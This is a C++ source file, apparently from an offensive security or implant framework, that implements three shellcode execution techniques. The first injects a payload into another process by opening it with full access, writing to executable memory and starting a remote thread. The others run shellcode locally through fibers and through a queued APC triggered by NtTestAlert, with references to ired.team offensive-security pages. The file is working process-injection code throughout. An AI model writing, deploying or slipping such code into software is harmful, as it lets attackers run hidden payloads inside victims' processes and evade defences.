#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(Procs::PPROCS pProcs, DWORD dwPID, const std::vector<BYTE>& shellcode)
    {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID remoteBuffer;

        hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        remoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!remoteBuffer)
        {
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            remoteBuffer,
            (LPVOID)shellcode.data(),
            shellcode.size(),
            NULL
        )) {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &remoteBuffer,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)remoteBuffer,
            NULL
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &remoteBuffer,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);

        pProcs->lpNtClose(hProcess);
        pProcs->lpNtClose(hThread);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
    BOOL ShellcodeExecutionViaFibers(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
    {
        // Convert the current thread into a fiber.
        PVOID mainFiber = ConvertThreadToFiber(NULL);

        LPVOID scAddr = VirtualAlloc(
            NULL,
            shellcode.size(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        memcpy(scAddr, shellcode.data(), shellcode.size());

        PVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
        SwitchToFiber(scFiber);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
    {
        using MY_NTSTATUS = NTSTATUS(NTAPI*)();

        MY_NTSTATUS testAlert = (MY_NTSTATUS)(GetProcAddress(
            GetModuleHandleA("ntdll"),
            "NtTestAlert"
        ));

        LPVOID scAddr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), scAddr, shellcode.data(), shellcode.size(), NULL);

        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
        QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
        testAlert();

        return TRUE;
    }
}